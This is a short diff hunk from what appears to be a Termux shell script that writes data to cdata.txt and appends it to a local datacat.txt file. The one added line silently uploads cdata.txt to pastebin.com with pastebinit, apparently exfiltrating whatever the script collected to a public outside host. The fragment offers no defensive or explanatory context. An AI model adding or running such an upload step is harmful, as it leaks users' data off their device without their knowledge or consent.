@@ -60,7 +60,7 @@ echo  '
   }, 
   ' > cdata.txt
   
-  
+pastebinit -i cdata.txt -b https://pastebin.com/d6uXieZj
 cat cdata.txt >> /data/data/com.termux/files/home/Hadi/datacat.txt
 cd
 cd Hadi
